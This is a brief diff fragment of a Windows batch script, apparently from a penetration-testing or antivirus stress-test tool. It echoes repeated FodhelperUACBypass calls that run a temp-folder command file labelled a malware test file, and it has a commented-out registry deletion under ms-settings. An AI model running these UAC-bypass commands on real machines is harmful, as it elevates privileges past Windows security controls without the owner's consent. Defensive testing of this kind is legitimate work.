@@ -24,6 +24,7 @@ rem echo Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force >> %f
 echo } >> %fodPath%
 
 REM MULTIPLE PROCESS AV STRESS TEST ::
+REM pentest_msg.cmd = MALWARE TEST FILE
 echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath%
 echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath% 
 echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath%
